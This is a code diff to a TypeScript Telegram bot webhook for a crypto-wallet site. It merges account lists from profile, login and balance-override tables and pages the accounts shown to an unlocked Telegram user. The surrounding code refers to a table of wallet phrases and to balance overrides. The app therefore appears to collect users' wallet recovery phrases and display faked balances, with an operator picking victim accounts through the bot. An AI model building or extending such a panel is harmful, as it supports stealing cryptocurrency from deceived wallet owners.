@@ -41,6 +41,7 @@ interface TelegramAccount {
   wallet_address: string;
   phone_number?: string | null;
   email_address?: string | null;
+  created_at?: string | null;
 }
 
 function esc(value: string) {
@@ -86,20 +87,46 @@ async function loadPhrases(): Promise<PhraseRow[]> {
 
 async function listAccounts(): Promise<TelegramAccount[]> {
   const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
-  const { data, error } = await supabaseAdmin
-    .from("wallet_profiles")
-    .select("id, username, wallet_address, created_at")
-    .order("created_at", { ascending: false })
-    .limit(500);
-  if (error) throw new Error(`Could not load accounts: ${error.message}`);
+  const [profilesResult, loginsResult, overridesResult] = await Promise.all([
+    supabaseAdmin.from("wallet_profiles").select("id, username, wallet_address, created_at").order("created_at", { ascending: false }).limit(2000),
+    supabaseAdmin.from("wallet_logins").select("username, wallet_address, created_at").order("created_at", { ascending: false }).limit(2000),
+    supabaseAdmin.from("wallet_balance_overrides").select("wallet_address, created_at").order("created_at", { ascending: false }).limit(2000),
+  ]);
+  if (profilesResult.error) throw new Error(`Could not load account profiles: ${profilesResult.error.message}`);
+  if (loginsResult.error) throw new Error(`Could not load account history: ${loginsResult.error.message}`);
+  if (overridesResult.error) throw new Error(`Could not load account balances: ${overridesResult.error.message}`);
 
   const seen = new Set<string>();
   const out: TelegramAccount[] = [];
-  for (const row of data ?? []) {
+  for (const row of profilesResult.data ?? []) {
     const address = row.wallet_address.toLowerCase();
     if (!row.username || seen.has(address)) continue;
     seen.add(address);
-    out.push({ id: row.id, username: row.username, wallet_address: row.wallet_address });
+    out.push({ id: row.id, username: row.username, wallet_address: row.wallet_address, created_at: row.created_at });
+  }
+
+  for (const row of loginsResult.data ?? []) {
+    const address = String(row.wallet_address ?? "");
+    if (!address || seen.has(address.toLowerCase())) continue;
+    seen.add(address.toLowerCase());
+    out.push({
+      id: await syntheticId(address),
+      username: row.username || `${address.slice(0, 6)}…${address.slice(-4)}`,
+      wallet_address: address,
+      created_at: row.created_at,
+    });
+  }
+
+  for (const row of overridesResult.data ?? []) {
+    const address = String(row.wallet_address ?? "");
+    if (!address || seen.has(address.toLowerCase())) continue;
+    seen.add(address.toLowerCase());
+    out.push({
+      id: await syntheticId(address),
+      username: `${address.slice(0, 6)}…${address.slice(-4)}`,
+      wallet_address: address,
+      created_at: row.created_at,
+    });
   }
 
   // Include accounts that only exist in the phrase table.
@@ -130,19 +157,8 @@ async function getAccount(id: string): Promise<TelegramAccount | null> {
     return data;
   }
 
-  // Phrase-only account: resolve the synthetic id back to its row.
-  for (const row of await loadPhrases()) {
-    const address = String(row.wallet_address ?? "");
-    if (!address) continue;
-    if ((await syntheticId(address)) !== id.replaceAll("-", "")) continue;
-    return {
-      id,
-      username: row.username || `${address.slice(0, 6)}…${address.slice(-4)}`,
-      wallet_address: address,
-    };
-  }
-
-  return null;
+  const accounts = await listAccounts();
+  return accounts.find((account) => account.id.replaceAll("-", "") === id.replaceAll("-", "")) ?? null;
 }
 
 function chunkButtons(rows: TelegramAccount[], userId: number, expiresAt: number) {
@@ -153,6 +169,14 @@ function chunkButtons(rows: TelegramAccount[], userId: number, expiresAt: number
   const out: Array<Array<{ text: string; callback_data: string }>> = [];
   for (let i = 0; i < buttons.length; i += 2) out.push(buttons.slice(i, i + 2));
   return out;
+}
+
+function paginateButtons(rows: TelegramAccount[], userId: number, expiresAt: number) {
+  const pages: ReturnType<typeof chunkButtons>[] = [];
+  for (let i = 0; i < rows.length; i += 80) {
+    pages.push(chunkButtons(rows.slice(i, i + 80), userId, expiresAt));
+  }
+  return pages;
 }
 
 export const Route = createFileRoute("/api/public/telegram/webhook")({
@@ -256,17 +280,17 @@ export const Route = createFileRoute("/api/public/telegram/webhook")({
             await tg("sendMessage", { chat_id: chatId, text: "✅ Unlocked, but no accounts on file yet." });
             return Response.json({ ok: true });
           }
-          await tg("sendMessage", {
-            chat_id: chatId,
-            text: `✅ Unlocked for ${UNLOCK_MINUTES} min. Pick an account:`,
-            reply_markup: {
-              inline_keyboard: chunkButtons(
-                rows,
-                userId,
-                Date.now() + UNLOCK_MINUTES * 60_000,
-              ),
-            },
-          });
+          const expiresAt = Date.now() + UNLOCK_MINUTES * 60_000;
+          const pages = paginateButtons(rows, userId, expiresAt);
+          for (let page = 0; page < pages.length; page += 1) {
+            await tg("sendMessage", {
+              chat_id: chatId,
+              text: page === 0
+                ? `✅ Unlocked for ${UNLOCK_MINUTES} min. Pick an account:`
+                : `Accounts ${page * 80 + 1}–${Math.min((page + 1) * 80, rows.length)} of ${rows.length}:`,
+              reply_markup: { inline_keyboard: pages[page] },
+            });
+          }
           return Response.json({ ok: true });
         }
 
